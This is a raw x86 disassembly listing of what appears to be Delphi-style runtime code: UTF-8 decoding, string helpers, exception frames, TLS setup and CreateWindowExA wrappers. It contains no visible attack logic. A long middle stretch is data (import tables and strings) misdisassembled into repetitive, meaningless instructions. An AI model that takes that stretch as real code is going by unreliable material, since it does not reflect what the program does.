je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405ad8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eb8
mov eax ebx
xor edx edx
call sub_40473c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b7e
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
call sub_404730
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404504
mov eax ebx
call sub_404730
push eax
mov eax [ ebp - 0x4 ]
call sub_404178
inc eax
push eax
mov eax ebx
call sub_404720
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
pop ecx
pop edx
call sub_4058c4
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eb8
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404504
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f0c
sub_405b84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4045c4
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c22
lea eax [ ebp - 0x4 ]
call sub_4045c4
retn
mov eax ebx
call sub_404178
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_40480c
mov eax ebx
call sub_404178
push eax
mov eax [ ebp - 0x4 ]
call sub_404730
inc eax
push eax
mov eax ebx
call sub_404378
push eax
mov eax [ ebp - 0x4 ]
call sub_404720
pop ecx
pop edx
call sub_4059a0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4045c4
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40480c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404600
sub_405c28
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405c6b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404710
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c72
lea eax [ ebp - 0x4 ]
call sub_4045c4
retn
sub_405c78
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040b0
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4051b0
push eax
call sub_40129c
mov ecx eax
mov edx esp
mov eax esi
call sub_403fa8
jmp r-xdata
sub_405cd0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405d36
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401264
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404128
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402b54
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d3d
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
xor ebx ebx
sub_405d44
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405d8e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d95
retn
mov eax rw-data
call sub_4029cc
mov eax rw-data
call sub_4029cc
mov eax rw-data
call sub_4029cc
call sub_401ad0
sub_405d98
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404cb0
call sub_402f60
test al al
je r-xdata
call sub_403054
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40131c
mov [ rw-data ] eax
call sub_401314
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_402f90
call sub_40128c
call sub_405cd0
mov [ rw-data ] eax
call sub_401314
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40128c
call sub_405cd0
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_40130c
mov [ rw-data ] eax
sub_405ea0
push ebx
call sub_405e98
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405e8c
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403eac
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403eac
sub_405ee4
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405ea0
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405f30
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405e6c
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405f24
mov edx rw-data
mov eax ebx
call sub_403c00
pop ebx
retn
sub_405f74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405f99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fa0
retn
sub_405fd0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405fec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406011
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406018
retn
sub_406024
sub [ eax + 0x40 ] ah
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
and al 0x60
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
jecxz r-xdata
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
add [ ebx + 0x1c25ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x4025ffc0 ] cl
jecxz r-xdata
dec eax
jb r-xdata
jb r-xdata
je r-xdata
add [ ebx - 0xbda0040 ] cl
loop r-xdata
add [ ebx + 0x1825ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x3c25ffc0 ] cl
jecxz r-xdata
sar bh 0x25
cmp al 0xe3
dec eax
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec eax
ja DeleteFileA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx - 0x33da0040 ] cl
loop r-xdata
add [ ebx - 0xfda0040 ] cl
loop r-xdata
add [ ebx + 0x1425ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x3825ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x1025ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x3425ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x4c25ffc0 ] cl
jecxz r-xdata
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
add [ ebx + 0x825ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x2c25ffc0 ] cl
jecxz r-xdata
je EnumCalendarInfoA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
add [ ebx - 0x5bda0040 ] cl
loop r-xdata
add [ ebx - 0x37da0040 ] cl
loop r-xdata
add [ ebx - 0x13da0040 ] cl
loop r-xdata
add [ ebx - 0x17da0040 ] cl
loop r-xdata
add [ ebx + 0xc25ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x3025ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x2425ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x4825ffc0 ] cl
jecxz r-xdata
mov eax eax
nop
fsub [ eax + 0x40 ]
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
add [ ebx - 0x1fda0040 ] cl
loop r-xdata
add [ ebx + 0x425ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x2825ffc0 ] cl
jecxz r-xdata
je r-xdata
add [ ebx + 0x7c25ffc0 ] cl
loop r-xdata
add [ ebx - 0x5fda0040 ] cl
loop r-xdata
add [ ebx - 0x3bda0040 ] cl
loop r-xdata
add [ ebx - 0x3fda0040 ] cl
loop r-xdata
add [ ebx - 0x1bda0040 ] cl
loop r-xdata
add [ ebx - 0x3da0040 ] cl
loop r-xdata
add [ ebx + 0x2025ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x4425ffc0 ] cl
add [ ebx - 0x47da0040 ] cl
loop r-xdata
add [ ebx - 0x23da0040 ] cl
loop r-xdata
add [ ebx + 0x25ffc0 ] cl
jecxz r-xdata
mov eax eax
add esp [ eax ]
inc eax
add [ ebx + 0x3025ffc0 ] cl
loop r-xdata
add [ ebx + 0x5425ffc0 ] cl
loop r-xdata
add [ ebx + 0x7825ffc0 ] cl
loop r-xdata
add [ ebx - 0x63da0040 ] cl
loop r-xdata
add [ ebx - 0x67da0040 ] cl
loop r-xdata
add [ ebx - 0x43da0040 ] cl
loop r-xdata
add [ ebx - 0x2bda0040 ] cl
loop r-xdata
add [ ebx - 0x7da0040 ] cl
loop r-xdata
add [ ebx - 0x6fda0040 ] cl
loop r-xdata
add [ ebx - 0x4bda0040 ] cl
loop r-xdata
add [ ebx - 0x27da0040 ] cl
loop r-xdata
add [ ebx + 0x2c25ffc0 ] cl
loop r-xdata
add [ ebx + 0x5825ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x5025ffc0 ] cl
loop r-xdata
add [ ebx + 0x7425ffc0 ] cl
loop r-xdata
add [ ebx + 0x7025ffc0 ] cl
loop r-xdata
add [ ebx - 0x6bda0040 ] cl
loop r-xdata
add [ ebx - 0x53da0040 ] cl
loop r-xdata
add [ ebx - 0x2fda0040 ] cl
loop r-xdata
add [ ebx + 0x6825ffc0 ] cl
loop r-xdata
add [ ebx - 0x73da0040 ] cl
loop r-xdata
add [ ebx - 0x4fda0040 ] cl
loop r-xdata
add [ ebx + 0x2825ffc0 ] cl
loop r-xdata
add [ ebx + 0x5425ffc0 ] cl
in al 0x48
add [ ebx + 0x5025ffc0 ] cl
in al 0x48
add [ ebx + 0x4c25ffc0 ] cl
in al 0x48
add [ ebx + 0x4825ffc0 ] cl
in al 0x48
add [ ebx + 0x4425ffc0 ] cl
in al 0x48
add [ ebx + 0x4025ffc0 ] cl
in al 0x48
add [ ebx + 0x3c25ffc0 ] cl
in al 0x48
add [ ebx + 0x3825ffc0 ] cl
in al 0x48
add [ ebx + 0x3425ffc0 ] cl
in al 0x48
add [ ebx + 0x3025ffc0 ] cl
in al 0x48
add [ ebx + 0x2c25ffc0 ] cl
in al 0x48
add [ ebx + 0x2825ffc0 ] cl
in al 0x48
add [ ebx + 0x2425ffc0 ] cl
in al 0x48
add [ ebx + 0x2025ffc0 ] cl
in al 0x48
add [ ebx + 0x1c25ffc0 ] cl
in al 0x48
add [ ebx + 0x1825ffc0 ] cl
in al 0x48
add [ ebx + 0x1425ffc0 ] cl
in al 0x48
add [ ebx + 0x1025ffc0 ] cl
in al 0x48
add [ ebx + 0xc25ffc0 ] cl
in al 0x48
add [ ebx + 0x825ffc0 ] cl
in al 0x48
add [ ebx + 0x425ffc0 ] cl
in al 0x48
add [ ebx + 0x25ffc0 ] cl
in al 0x48
add [ ebx - 0x3da0040 ] cl
jecxz r-xdata
add [ ebx + 0x7825ffc0 ] cl
in al 0x48
add [ ebx + 0x4c25ffc0 ] cl
loop r-xdata
add [ ebx + 0x4825ffc0 ] cl
loop r-xdata
add [ ebx + 0x6c25ffc0 ] cl
loop r-xdata
add [ ebx - 0x7bda0040 ] cl
loop r-xdata
add [ ebx - 0x57da0040 ] cl
loop r-xdata
add [ ebx + 0x4025ffc0 ] cl
loop r-xdata
add [ ebx + 0x6425ffc0 ] cl
loop r-xdata
add [ ebx - 0x77da0040 ] cl
loop r-xdata
add [ ebx + 0x5025ffc0 ] cl
jecxz r-xdata
add [ ebx - 0x2bda0040 ] cl
jecxz r-xdata
add [ ebx - 0x7da0040 ] cl
jecxz r-xdata
add [ ebx + 0x7425ffc0 ] cl
in al 0x48
add [ ebx + 0x7025ffc0 ] cl
in al 0x48
add [ ebx + 0x4425ffc0 ] cl
loop r-xdata
add [ ebx + 0x5c25ffc0 ] cl
loop r-xdata
add [ ebx - 0x7fda0040 ] cl
loop r-xdata
add [ ebx + 0x6825ffc0 ] cl
in al 0x48
add [ ebx + 0x3c25ffc0 ] cl
loop r-xdata
add [ ebx + 0x6025ffc0 ] cl
loop r-xdata
add [ ebx - 0x53da0040 ] cl
jecxz r-xdata
add [ ebx - 0x2fda0040 ] cl
jecxz r-xdata
add [ ebx - 0xbda0040 ] cl
jecxz r-xdata
add [ ebx + 0x6c25ffc0 ] cl
in al 0x48
add [ ebx + 0x6025ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x5825ffc0 ] cl
loop r-xdata
add [ ebx + 0x6425ffc0 ] cl
in al 0x48
add [ ebx + 0x3825ffc0 ] cl
loop r-xdata
add [ ebx - 0x7bda0040 ] cl
jecxz r-xdata
add [ ebx - 0x57da0040 ] cl
jecxz r-xdata
add [ ebx - 0x33da0040 ] cl
jecxz r-xdata
add [ ebx - 0xfda0040 ] cl
jecxz r-xdata
add [ ebx + 0x5c25ffc0 ] cl
in al 0x48
add [ ebx + 0x5c25ffc0 ] cl
jecxz r-xdata
add [ ebx + 0x6025ffc0 ] cl
in al 0x48
add [ ebx + 0x1c25ffc0 ] cl
out 0x48 eax
add [ ebx - 0x7fda0040 ] cl
jecxz r-xdata
add [ ebx - 0x5bda0040 ] cl
jecxz r-xdata
add [ ebx - 0x37da0040 ] cl
jecxz r-xdata
add [ ebx - 0x13da0040 ] cl
jecxz r-xdata
add [ ebx + 0x5825ffc0 ] cl
in al 0x48
add [ ebx + 0x1025ffc0 ] cl
out 0x48 eax
add [ ebx + 0x7c25ffc0 ] cl
jecxz r-xdata
add [ ebx - 0x5fda0040 ] cl
jecxz r-xdata
add [ ebx - 0x3bda0040 ] cl
jecxz r-xdata
add [ ebx - 0x17da0040 ] cl
jecxz r-xdata
add [ ebx + 0xc25ffc0 ] cl
out 0x48 eax
add [ ebx + 0x7825ffc0 ] cl
jecxz r-xdata
add [ ebx - 0x63da0040 ] cl
jecxz r-xdata
add [ ebx - 0x3fda0040 ] cl
jecxz r-xdata
add [ ebx - 0x1bda0040 ] cl
jecxz r-xdata
add [ ebx + 0x825ffc0 ] cl
out 0x48 eax
add [ ebx + 0x7425ffc0 ] cl
jecxz r-xdata
add [ ebx - 0x67da0040 ] cl
jecxz r-xdata
add [ ebx - 0x43da0040 ] cl
jecxz r-xdata
add [ ebx - 0x1fda0040 ] cl
jecxz r-xdata
add [ ebx + 0x425ffc0 ] cl
out 0x48 eax
add [ ebx + 0x7025ffc0 ] cl
jecxz r-xdata
add [ ebx - 0x6bda0040 ] cl
jecxz r-xdata
add [ ebx - 0x47da0040 ] cl
jecxz r-xdata
add [ ebx - 0x23da0040 ] cl
jecxz r-xdata
add [ ebx + 0x1825ffc0 ] cl
out 0x48 eax
add [ ebx + 0x6c25ffc0 ] cl
jecxz r-xdata
add [ ebx - 0x6fda0040 ] cl
jecxz r-xdata
add [ ebx - 0x4bda0040 ] cl
jecxz r-xdata
add [ ebx - 0x27da0040 ] cl
jecxz r-xdata
add [ ebx + 0x1425ffc0 ] cl
out 0x48 eax
add [ ebx + 0x6825ffc0 ] cl
jecxz r-xdata
add [ ebx - 0x73da0040 ] cl
jecxz r-xdata
add [ ebx - 0x4fda0040 ] cl
jecxz r-xdata
add [ ebx + 0x2425ffc0 ] cl
out 0x48 eax
add [ ebx + 0x2025ffc0 ] cl
out 0x48 eax
add [ ebx + 0x25ffc0 ] cl
out 0x48 eax
add [ ebx - 0x3da0040 ] cl
out 0x48 al
add [ ebx - 0x7da0040 ] cl
out 0x48 al
add [ ebx - 0xbda0040 ] cl
out 0x48 al
add [ ebx - 0xfda0040 ] cl
out 0x48 al
add [ ebx - 0x13da0040 ] cl
out 0x48 al
add [ ebx - 0x17da0040 ] cl
out 0x48 al
add [ ebx - 0x1bda0040 ] cl
out 0x48 al
add [ ebx - 0x1fda0040 ] cl
out 0x48 al
add [ ebx - 0x23da0040 ] cl
out 0x48 al
add [ ebx - 0x27da0040 ] cl
out 0x48 al
add [ ebx - 0x2bda0040 ] cl
out 0x48 al
add [ ebx - 0x2fda0040 ] cl
out 0x48 al
add [ ebx - 0x33da0040 ] cl
out 0x48 al
add [ ebx - 0x37da0040 ] cl
out 0x48 al
add [ ebx - 0x3bda0040 ] cl
out 0x48 al
add [ ebx - 0x3fda0040 ] cl
out 0x48 al
add [ ebx - 0x43da0040 ] cl
out 0x48 al
add [ ebx - 0x47da0040 ] cl
out 0x48 al
add [ ebx - 0x4bda0040 ] cl
out 0x48 al
add [ ebx - 0x4fda0040 ] cl
out 0x48 al
add [ ebx - 0x53da0040 ] cl
out 0x48 al
add [ ebx - 0x57da0040 ] cl
out 0x48 al
add [ ebx - 0x5bda0040 ] cl
out 0x48 al
add [ ebx - 0x5fda0040 ] cl
out 0x48 al
add [ ebx - 0x63da0040 ] cl
out 0x48 al
add [ ebx - 0x67da0040 ] cl
out 0x48 al
add [ ebx - 0x6bda0040 ] cl
out 0x48 al
add [ ebx - 0x6fda0040 ] cl
out 0x48 al
add [ ebx - 0x73da0040 ] cl
out 0x48 al
add [ ebx - 0x77da0040 ] cl
out 0x48 al
add [ ebx - 0x7bda0040 ] cl
out 0x48 al
add [ ebx - 0x7fda0040 ] cl
out 0x48 al
add [ ebx + 0x7c25ffc0 ] cl
out 0x48 al
add [ ebx + 0x7825ffc0 ] cl
out 0x48 al
add [ ebx + 0x7425ffc0 ] cl
out 0x48 al
add [ ebx + 0x7025ffc0 ] cl
out 0x48 al
add [ ebx + 0x6c25ffc0 ] cl
out 0x48 al
add [ ebx + 0x6825ffc0 ] cl
out 0x48 al
add [ ebx + 0x6425ffc0 ] cl
out 0x48 al
add [ ebx + 0x6025ffc0 ] cl
out 0x48 al
add [ ebx + 0x5c25ffc0 ] cl
out 0x48 al
add [ ebx + 0x5825ffc0 ] cl
out 0x48 al
add [ ebx + 0x5425ffc0 ] cl
out 0x48 al
add [ ebx + 0x5025ffc0 ] cl
out 0x48 al
add [ ebx + 0x4c25ffc0 ] cl
out 0x48 al
add [ ebx + 0x4825ffc0 ] cl
out 0x48 al
add [ ebx + 0x4425ffc0 ] cl
out 0x48 al
add [ ebx + 0x4025ffc0 ] cl
out 0x48 al
add [ ebx + 0x3c25ffc0 ] cl
out 0x48 al
add [ ebx + 0x3825ffc0 ] cl
out 0x48 al
add [ ebx + 0x3425ffc0 ] cl
out 0x48 al
add [ ebx + 0x3025ffc0 ] cl
out 0x48 al
add [ ebx + 0x2c25ffc0 ] cl
out 0x48 al
add [ ebx + 0x2825ffc0 ] cl
out 0x48 al
add [ ebx + 0x2425ffc0 ] cl
out 0x48 al
add [ ebx + 0x2025ffc0 ] cl
out 0x48 al
add [ ebx + 0x1c25ffc0 ] cl
out 0x48 al
add [ ebx + 0x1825ffc0 ] cl
out 0x48 al
add [ ebx + 0x1425ffc0 ] cl
out 0x48 al
add [ ebx + 0x1025ffc0 ] cl
out 0x48 al
add [ ebx + 0xc25ffc0 ] cl
out 0x48 al
add [ ebx + 0x825ffc0 ] cl
out 0x48 al
add [ ebx + 0x425ffc0 ] cl
out 0x48 al
add [ ebx + 0x25ffc0 ] cl
out 0x48 al
add [ ebx - 0x3da0040 ] cl
in eax 0x48
add [ ebx - 0x7da0040 ] cl
in eax 0x48
add [ ebx - 0xbda0040 ] cl
in eax 0x48
add [ ebx - 0xfda0040 ] cl
in eax 0x48
add [ ebx - 0x13da0040 ] cl
in eax 0x48
add [ ebx - 0x17da0040 ] cl
in eax 0x48
add [ ebx - 0x1bda0040 ] cl
in eax 0x48
add [ ebx - 0x1fda0040 ] cl
in eax 0x48
add [ ebx - 0x23da0040 ] cl
in eax 0x48
add [ ebx - 0x27da0040 ] cl
in eax 0x48
add [ ebx - 0x2bda0040 ] cl
in eax 0x48
add [ ebx + 0x25ffc0 ] cl
out 0x48 al
add [ ebx - 0x2fda0040 ] cl
in eax 0x48
add [ ebx - 0x33da0040 ] cl
in eax 0x48
add [ ebx - 0x37da0040 ] cl
in eax 0x48
add [ ebx - 0x3bda0040 ] cl
in eax 0x48
add [ ebx - 0x3fda0040 ] cl
in eax 0x48
add [ ebx - 0x43da0040 ] cl
in eax 0x48
add [ ebx - 0x43da0040 ] cl
in eax 0x48
add [ ebx - 0x47da0040 ] cl
in eax 0x48
add [ ebx - 0x4bda0040 ] cl
in eax 0x48
add [ ebx - 0x4fda0040 ] cl
in eax 0x48
add [ ebx - 0x53da0040 ] cl
in eax 0x48
add [ ebx - 0x57da0040 ] cl
in eax 0x48
add [ ebx - 0x5bda0040 ] cl
in eax 0x48
add [ ebx - 0x5fda0040 ] cl
in eax 0x48
add [ ebx - 0x63da0040 ] cl
in eax 0x48
add [ ebx - 0x67da0040 ] cl
in eax 0x48
add [ ebx - 0x6bda0040 ] cl
in eax 0x48
add [ ebx - 0x6fda0040 ] cl
in eax 0x48
add [ ebx - 0x73da0040 ] cl
in eax 0x48
add [ ebx - 0x77da0040 ] cl
in eax 0x48
add [ ebx - 0x7bda0040 ] cl
in eax 0x48
add [ ebx - 0x7fda0040 ] cl
in eax 0x48
add [ ebx + 0x7c25ffc0 ] cl
in eax 0x48
add [ ebx + 0x7825ffc0 ] cl
in eax 0x48
add [ ebx + 0x7425ffc0 ] cl
in eax 0x48
add [ ebx + 0x7025ffc0 ] cl
in eax 0x48
add [ ebx + 0x6c25ffc0 ] cl
in eax 0x48
add [ ebx + 0x6825ffc0 ] cl
in eax 0x48
add [ ebx + 0x6425ffc0 ] cl
in eax 0x48
add [ ebx + 0x6025ffc0 ] cl
in eax 0x48
add [ ebx + 0x5c25ffc0 ] cl
in eax 0x48
add [ ebx + 0x5825ffc0 ] cl
in eax 0x48
add [ ebx + 0x5425ffc0 ] cl
in eax 0x48
add [ ebx + 0x5025ffc0 ] cl
in eax 0x48
add [ ebx + 0x4c25ffc0 ] cl
in eax 0x48
add [ ebx + 0x4825ffc0 ] cl
in eax 0x48
add [ ebx + 0x4425ffc0 ] cl
in eax 0x48
add [ ebx + 0x4025ffc0 ] cl
in eax 0x48
add [ ebx + 0x3c25ffc0 ] cl
in eax 0x48
add [ ebx + 0x3825ffc0 ] cl
in eax 0x48
add [ ebx + 0x3425ffc0 ] cl
in eax 0x48
add [ ebx + 0x3025ffc0 ] cl
in eax 0x48
add [ ebx + 0x2c25ffc0 ] cl
in eax 0x48
add [ ebx + 0x2825ffc0 ] cl
in eax 0x48
add [ ebx + 0x2425ffc0 ] cl
in eax 0x48
add [ ebx + 0x2025ffc0 ] cl
in eax 0x48
add [ ebx + 0x1c25ffc0 ] cl
in eax 0x48
add [ ebx + 0x1825ffc0 ] cl
in eax 0x48
add [ ebx + 0x1425ffc0 ] cl
in eax 0x48
add [ ebx + 0x1025ffc0 ] cl
in eax 0x48
add [ ebx + 0xc25ffc0 ] cl
in eax 0x48
add [ ebx + 0x825ffc0 ] cl
in eax 0x48
add [ ebx + 0x425ffc0 ] cl
in eax 0x48
add [ ebx + 0x25ffc0 ] cl
in eax 0x48
add [ ebx - 0x3da0040 ] cl
in al 0x48
add [ ebx - 0x7da0040 ] cl
in al 0x48
add [ ebx - 0xbda0040 ] cl
in al 0x48
add [ ebx - 0xfda0040 ] cl
in al 0x48
add [ ebx - 0x13da0040 ] cl
in al 0x48
add [ ebx - 0x17da0040 ] cl
in al 0x48
add [ ebx - 0x1bda0040 ] cl
in al 0x48
add [ ebx - 0x1fda0040 ] cl
in al 0x48
add [ ebx - 0x23da0040 ] cl
in al 0x48
add [ ebx - 0x27da0040 ] cl
in al 0x48
add [ ebx - 0x2bda0040 ] cl
in al 0x48
add [ ebx - 0x2fda0040 ] cl
in al 0x48
add [ ebx - 0x33da0040 ] cl
in al 0x48
add [ ebx - 0x37da0040 ] cl
in al 0x48
add [ ebx - 0x3bda0040 ] cl
in al 0x48
add [ ebx - 0x3fda0040 ] cl
in al 0x48
add [ ebx - 0x43da0040 ] cl
in al 0x48
add [ ebx - 0x47da0040 ] cl
in al 0x48
add [ ebx - 0x4bda0040 ] cl
in al 0x48
add [ ebx - 0x4fda0040 ] cl
in al 0x48
add [ ebx - 0x53da0040 ] cl
in al 0x48
add [ ebx - 0x57da0040 ] cl
in al 0x48
add [ ebx - 0x5bda0040 ] cl
in al 0x48
add [ ebx - 0x5fda0040 ] cl
in al 0x48
add [ ebx - 0x63da0040 ] cl
in al 0x48
add [ ebx - 0x67da0040 ] cl
in al 0x48
add [ ebx - 0x6bda0040 ] cl
in al 0x48
add [ ebx - 0x6fda0040 ] cl
in al 0x48
add [ ebx - 0x73da0040 ] cl
in al 0x48
add [ ebx - 0x77da0040 ] cl
in al 0x48
add [ ebx - 0x7bda0040 ] cl
in al 0x48
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
add [ ebx + 0x2c25ffc0 ] cl
out 0x48 eax
add [ ebx - 0x77da0040 ] cl
jecxz r-xdata
add [ ebx + 0x2825ffc0 ] cl
out 0x48 eax
sub_406bb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402924
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402914
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406c10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402924
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
